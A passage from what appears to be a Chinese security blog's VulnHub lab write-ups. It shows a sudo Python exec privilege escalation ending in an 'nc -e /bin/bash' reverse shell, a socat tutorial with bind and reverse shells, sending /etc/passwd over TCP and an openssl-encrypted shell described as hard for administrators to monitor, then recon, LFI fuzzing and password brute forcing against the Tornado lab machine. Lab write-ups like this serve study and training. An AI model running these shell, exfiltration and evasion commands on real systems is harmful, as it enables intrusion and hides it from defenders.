&lt;p&gt;搜索 python 的 exec 如何执行，在下图的示例中，可见需要在 exec 中添加的内&lt;br&gt;
容为 print（‘Hello World’）的形式&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1286.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;同样先把 print (‘Hello World’) 转为为十六进制&lt;br&gt;
 python3 -c “print (b&amp;quot;print (‘Hello World’)”.hex ())&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1287.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;将得到的数据 7072696e7 428274 8656c6c6f20576f726c6 42729 带入到脚本中执行&lt;br&gt;
执行成功，并且打印出来了 Hello World&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1288.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;通过 python 命令行引入 os 包，以 os 包下的 system 执行系统命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;print(b\&amp;quot;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;whoami&amp;#x27;)\&amp;quot;.hex())&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1289.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo python3 /root/oras.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5f5f696d706f727 4 5f5f28276f7327292e7379737 4 656d282777686f616d692729&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;![](/N1h1l157/VULNHUB/image-1290.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过nc将root的shell反弹出来&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;print(b\&amp;quot;__import__(&amp;#x27;os&amp;#x27;).system(&amp;#x27;nc -e /bin/bash 192.168.31.99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4446&amp;#x27;)\&amp;quot;.hex())&amp;quot; | sudo python3 /root/oras.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5f5f696d706f727 4 5f5f28276f7327292e7379737 4 656d28276e63202d65202f62696&lt;br&gt;
e2f62617368203139322e3136382e33312e3939203 43434362729&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1291.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最终拿到了 root 权限&lt;/p&gt;
&lt;h3 id=&#34;006-socat通信-端口转发-文件传输-规避防火墙-远程登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#006-socat通信-端口转发-文件传输-规避防火墙-远程登录&#34;&gt;#&lt;/a&gt; 006 socat 通信、端口转发、文件传输、规避防火墙、远程登录&lt;/h3&gt;
&lt;p&gt;socat 功能灵活，除了完成 nc 能完成的所有任务外，还有很多实用的用法：&lt;br&gt;
基本命令就是：socat [参数] &amp;lt; 地址 1 &amp;gt; &amp;lt; 地址 2 &amp;gt;&lt;br&gt;
 使用 socat 需要提供两个地址，socat 会将这两个地址的数据流串起来，把第&lt;br&gt;
左边地址的输出数据传给右边，同时又把右边输出的数据传到左边。Socat 的主&lt;br&gt;
要特点就是在两个数据流之间建立通道，且支持众多协议和链接方式。如 IP、&lt;br&gt;
TCP、UDP、IPv6、PIPE、EXEC、System、Open、Proxy、Openssl、Socket 等。&lt;/p&gt;
&lt;p&gt;socat - - # 把标准输入和标准输出对接，输入什么显示什么&lt;br&gt;
就会对接标准输入和标准输出，类似无参数的 cat 命令&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1292.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;网络测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网络测试&#34;&gt;#&lt;/a&gt; 网络测试&lt;/h3&gt;
&lt;h3 id=&#34;两台主机到底网络能否联通&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#两台主机到底网络能否联通&#34;&gt;#&lt;/a&gt; 两台主机到底网络能否联通：&lt;/h3&gt;
&lt;p&gt;socat - TCP-LISTEN:8080 # 终端 1 上启动 server 监听 TCP&lt;br&gt;
socat - TCP:localhost:8080 # 终端 2 上启动 client 链接 TCP&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1293.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;服务端在 TCP-LISTEN 地址后面加了 fork 的参数后，就能同时应答多个链接过&lt;br&gt;
来的客户端，每个客户端会 fork 一个进程出来进行通信，加上 reuseaddr 可&lt;br&gt;
以防止链接没断开玩无法监听的问题。&lt;/p&gt;
&lt;p&gt;socat - TCP-LISTEN:8080,fork,reuseaddr # 终端 1 上启动 server&lt;br&gt;
socat - TCP:localhost:8080 # 终端 2 上启动 client&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1294.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;socat 也可以用 UDP 进行通信&lt;br&gt;
 socat - UDP-LISTEN:8080 # 终端 1 上启动 server 监听 UDP&lt;br&gt;
socat - UDP:localhost:8080 # 终端 2 上启动 client 链接 UDP&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1295.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;端口转发&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口转发&#34;&gt;#&lt;/a&gt; 端口转发&lt;/h3&gt;
&lt;h3 id=&#34;在主机上监听-8080-端口将-8080-端口所有流量转发给远程机器的-80-端口同&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#在主机上监听-8080-端口将-8080-端口所有流量转发给远程机器的-80-端口同&#34;&gt;#&lt;/a&gt; 在主机上监听 8080 端口，将 8080 端口所有流量转发给远程机器的 80 端口，同&lt;/h3&gt;
&lt;p&gt;时在远程机器上开启一个 web 界面：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1296.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;使用以下命令访问127001的流量都转发到了111752219的-8080-上了&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#使用以下命令访问127001的流量都转发到了111752219的-8080-上了&#34;&gt;#&lt;/a&gt; 使用以下命令，访问 127.0.0.1 的流量都转发到了 1.117.52.219 的 8080 上了&lt;/h3&gt;
&lt;p&gt;socat TCP-LISTEN:8080,fork,reuseaddr TCP:1.117.52.219:80&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1297.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;socat 加上 fork 以后，每次 accept 一个链接都会 fork 出一份来不影响接收其他&lt;br&gt;
的新连接，这样 socat 就可以当一个端口转发服务，一直启动在那里。&lt;/p&gt;
&lt;p&gt;本地转发，在 80 端口起一个 python 的 http.server 服务&lt;br&gt;
将 80 端口的服务转发至本地的 8888 端口&lt;br&gt;
 socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1: 80&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1298.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1299.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;日志信息输出&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#日志信息输出&#34;&gt;#&lt;/a&gt; 日志信息输出&lt;/h3&gt;
&lt;p&gt;socat -d -d tcp-listen:1234 -&lt;br&gt;
socat -d -d tcp-connect:127.0.0.1:1234 -&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1594.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;前面两个连续的 - d -d 代表调试信息的输出级别。&lt;/p&gt;
&lt;h3 id=&#34;文件传输&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#文件传输&#34;&gt;#&lt;/a&gt; 文件传输&lt;/h3&gt;
&lt;h3 id=&#34;采用file协议将文件传输到另一台机器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#采用file协议将文件传输到另一台机器&#34;&gt;#&lt;/a&gt; 采用 FILE 协议将文件传输到另一台机器&lt;/h3&gt;
&lt;p&gt;socat -d -d tcp-listen:1234 OPEN:filetransfer.txt,create&lt;br&gt;
sudo socat -d -d tcp-connect:127.0.0.1:1234 FILE:/etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1300.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;加密连接-规避防火墙&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#加密连接-规避防火墙&#34;&gt;#&lt;/a&gt; 加密连接、规避防火墙&lt;/h3&gt;
&lt;p&gt;socat 的强大之一在于支持 openssl、可以用于 openssl 连接，这样获取到的反&lt;br&gt;
弹 shell 将对网络管理员造成很大的排查难度&lt;br&gt;
创建一个将用于加密连接的证书，我们可以为此使用自签名证书&lt;br&gt;
 openssl req -newkey rsa: 2048 - nodes -keyout cert.key -x509 -days 1000 - out cert.crt&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1301.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这将会产生两个文件，cert.crt 和 cert.key，需要组合为 pem 文件&lt;br&gt;
 cat cert.key cert.crt &amp;gt; sslkey.pem&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1302.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;现在我们就得到了一个可以用来连接 socat 加密的证书&lt;br&gt;
当我们使用加密证书的时候，就不再用 tcp 监听链接，而是用的 openssl 监听，&lt;br&gt;
 因为没有使用有效证书需要添加 verify 标志禁用连接端的证书链校验&lt;br&gt;
 socat -d -d openssl-listen:1234,cert=sslkey.pem,verify=0 -&lt;br&gt;
socat -d -d openssl-connect:127.0.0.1: 1234 ,verify=0 exec:/bin/bash&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1303.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这是一个无法或者很难被网络管理员监控的加密链接这使得网络管理员更难&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这是一个无法或者很难被网络管理员监控的加密链接这使得网络管理员更难&#34;&gt;#&lt;/a&gt; 这是一个无法或者很难被网络管理员监控的加密链接，这使得网络管理员更难&lt;/h3&gt;
&lt;h3 id=&#34;分析我们的数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析我们的数据&#34;&gt;#&lt;/a&gt; 分析我们的数据&lt;/h3&gt;
&lt;h3 id=&#34;远程登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#远程登录&#34;&gt;#&lt;/a&gt; 远程登录&lt;/h3&gt;
&lt;h3 id=&#34;一个重要的地址类型就是-exec-可以执行程序并且把输入输出和另外一个地&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一个重要的地址类型就是-exec-可以执行程序并且把输入输出和另外一个地&#34;&gt;#&lt;/a&gt; 一个重要的地址类型就是 EXEC 可以执行程序并且把输入输出和另外一个地&lt;/h3&gt;
&lt;h3 id=&#34;址串起来比如服务端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#址串起来比如服务端&#34;&gt;#&lt;/a&gt; 址串起来，比如服务端：&lt;/h3&gt;
&lt;p&gt;socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash&lt;br&gt;
socat -d -d - TCP:localhost:8080&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1595.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;完善一点可以加些参数正&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#完善一点可以加些参数正&#34;&gt;#&lt;/a&gt; 完善一点可以加些参数：(正)&lt;/h3&gt;
&lt;p&gt;socat -d -d TCP-LISTEN:8080,fork,reuseaddr EXEC:/bin/bash,pty,stderr&lt;br&gt;
socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP:localhost:8080&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1304.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;也可以用如下的参数反&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#也可以用如下的参数反&#34;&gt;#&lt;/a&gt; 也可以用如下的参数：（反）&lt;/h3&gt;
&lt;p&gt;socat -d -d exec:‘bash -li’,pty,stderr,setsid,sigint,sane TCP:192.168.0.149:8080&lt;br&gt;
socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP-LISTEN:8080&lt;br&gt;
 这样可以把 bash 的标准错误重定向给标准输出，并且用终端模式运行。客户端&lt;br&gt;
可以像刚才那样登录，但是还可以更高级点，用 tty 的方式访问，这样基本就得&lt;br&gt;
到了一个全功能的交互式终端了，可以在里面运行 vim, emacs 之类的程序。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://n1h1l157.github.io/2021/11/01/VULNHUB/145%20TORANDO/</guid>
            <title>VULNHUB 45 TORANDO</title>
            <link>https://n1h1l157.github.io/2021/11/01/VULNHUB/145%20TORANDO/</link>
            <category>VULNHUB 41-50</category>
            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtdG9ybmFkbyw2Mzkv&#34;&gt;https://www.vulnhub.com/entry/ia-tornado,639/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hsanp6ai9hcnRpY2xlL2RldGFpbHMvMTIyOTUyNDI2&#34;&gt;https://blog.csdn.net/hljzzj/article/details/122952426&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaGlyYWswL2FydGljbGVzLzE2MjA3NTgwLmh0bWw=&#34;&gt;https://www.cnblogs.com/hirak0/articles/16207580.html&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;001-确认攻击目标的财产信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#001-确认攻击目标的财产信息&#34;&gt;#&lt;/a&gt; 001 确认攻击目标的财产信息&lt;/h3&gt;
&lt;p&gt;攻击机 kali： 1 92.168. 0. 150 (由于设置成了 DHCP、可能多变)&lt;br&gt;
 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | uniq&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1341.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
 sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1342.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;à 靶机 ip：192.168.31. 83 ，靶机开放端口 22 , 80&lt;/p&gt;
&lt;h3 id=&#34;对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#对靶机开放的端口做更深一步的检索检索各个服务上的详细信息&#34;&gt;#&lt;/a&gt; 对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/h3&gt;
&lt;p&gt;sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.183 --min-rate=5000&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1344.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;检索到的有效服务如下所示&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#检索到的有效服务如下所示&#34;&gt;#&lt;/a&gt; 检索到的有效服务如下所示：&lt;/h3&gt;
&lt;p&gt;22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
 80 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
&lt;h3 id=&#34;002-字典爆破登陆框测试lfi漏洞wfuzz模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#002-字典爆破登陆框测试lfi漏洞wfuzz模糊测试&#34;&gt;#&lt;/a&gt; 002 字典爆破，登陆框测试，LFI 漏洞，wfuzz 模糊测试&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjgu&#34;&gt;http://192.168.&lt;/span&gt; 0. 183 / 进行信息收集&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1345.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;一个 apache 界面，看了一下框架，查看 robots 协议，.git 文件，审查源代码&lt;br&gt;
后均没有什么发现，开始扫描目录&lt;br&gt;
 gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODM=&#34;&gt;http://192.168.0.183&lt;/span&gt;&lt;br&gt;
common.txt 字典稍微小一点，扫的速度比较快，是个不错的字典&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1346.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;没有扫描到有价值的信息换个大字典在扫一下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#没有扫描到有价值的信息换个大字典在扫一下&#34;&gt;#&lt;/a&gt; 没有扫描到有价值的信息，换个大字典在扫一下&lt;/h3&gt;
&lt;p&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-&lt;br&gt;
list-2. 3 - medium.txt -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODMv&#34;&gt;http://192.168.0.183/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1348.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫到一个目录 bluesky，访问 http://192.168.0.183/bluesky&lt;/p&gt;
&lt;p&gt;发现了一个新的站点，是一个新的 web 界面，可对此进行扫描&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1350.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirb/common.txt --url&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODMvYmx1ZXNreQ==&#34;&gt;http://192.168.0.183/bluesky&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1352.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;看到了注册登陆的功能，可以在 signup.php 下注册，然后在 login.php 下登陆&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1354.png&#34; alt&gt;&lt;br&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1356.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;登陆成功之后，dashboard 页面显示出了当前的用户名&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1357.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在 port 界面看到了有一个 LFI 漏洞的提示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1358.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;用 wfuzz 测试一下是否有参数&lt;br&gt;
 wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -u&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODMvYmx1ZXNreS9wb3J0LnBocD9GVVpaPXh4eA==&#34;&gt;http://192.168.0.183/bluesky/port.php?FUZZ=xxx&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1359.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;发现回显全是-302-过滤之后在看看判断是否有参数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#发现回显全是-302-过滤之后在看看判断是否有参数&#34;&gt;#&lt;/a&gt; 发现回显全是 302 ，过滤之后在看看，判断是否有参数&lt;/h3&gt;
&lt;p&gt;wfuzz -c -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNTMvYmx1ZXNreS9wb3J0LnBocD9GVVpaPXh4eA==&#34;&gt;http://192.168.31.53/bluesky/port.php?FUZZ=xxx&lt;/span&gt; - w&lt;br&gt;
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | grep -v 302&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1360.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;审查源代码看看有没有什么提示发现了一个文件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#审查源代码看看有没有什么提示发现了一个文件&#34;&gt;#&lt;/a&gt; 审查源代码，看看有没有什么提示，发现了一个文件&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1361.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;但是访问不到这个文件可能是做了一些变异&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#但是访问不到这个文件可能是做了一些变异&#34;&gt;#&lt;/a&gt; 但是访问不到这个文件，可能是做了一些变异&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1362.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;依次尝试怎么能访问到这个 imp.txt，最后在如下链接中找到了 imp.txt&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNjgvfnRvcmFuZG8vaW1wLnR4dA==&#34;&gt;http://192.168.0.168/~torando/imp.txt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1363.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;最后还有一个 contact.php，点开看看说是一些功能出于安全因素已经修复&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1364.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;整理一下收集到的重要的信息，有一份 imp.txt 可能是一些邮箱地址，还有一&lt;br&gt;
个注册一个登陆的地方，需要通过这几个条件做突破&lt;/p&gt;
&lt;h3 id=&#34;003-登陆测试-burp批量注册-用户多密码sql截断攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#003-登陆测试-burp批量注册-用户多密码sql截断攻击&#34;&gt;#&lt;/a&gt; 003 登陆测试、burp 批量注册、用户多密码，sql 截断攻击&lt;/h3&gt;
&lt;p&gt;将 imp.txt 下载到本地&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1365.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;依次用这几个用户尝试注册登陆第一个用户是新用户可进入其管理中心&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#依次用这几个用户尝试注册登陆第一个用户是新用户可进入其管理中心&#34;&gt;#&lt;/a&gt; 依次用这几个用户尝试注册登陆，第一个用户是新用户，可进入其管理中心&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1366.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;第二个也是一个未注册的新用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#第二个也是一个未注册的新用户&#34;&gt;#&lt;/a&gt; 第二个也是一个未注册的新用户&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1367.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;直到用第三个用户注册的时候发现了输入的用户名的长度被限制了&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#直到用第三个用户注册的时候发现了输入的用户名的长度被限制了&#34;&gt;#&lt;/a&gt; 直到用第三个用户注册的时候，发现了输入的用户名的长度被限制了&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1368.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改源代码的长度限制注册此用户&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改源代码的长度限制注册此用户&#34;&gt;#&lt;/a&gt; 修改源代码的长度限制，注册此用户&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1369.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;注册后发现也是一个新用户可以进入其管理中心想必这几个用户大部分都&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注册后发现也是一个新用户可以进入其管理中心想必这几个用户大部分都&#34;&gt;#&lt;/a&gt; 注册后发现也是一个新用户，可以进入其管理中心，想必这几个用户大部分都&lt;/h3&gt;
&lt;p&gt;是未注册的用户，少部分是一些敏感用户，直接用 burp 批量注册&lt;/p&gt;
&lt;p&gt;发现有两个用户是注册过的一个是 admin@torando，一个是 jacob@torando&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1370.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;这两个用户是已经存在的用户考虑爆破密码&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#这两个用户是已经存在的用户考虑爆破密码&#34;&gt;#&lt;/a&gt; 这两个用户是已经存在的用户，考虑爆破密码&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1371.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;数据拦截到 burp 中，选择 Cluster bomb 模式，对其进行爆破&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1372.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;uname 参数就设置为两个已经存在的用户&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1373.png&#34; alt&gt;&lt;/p&gt;
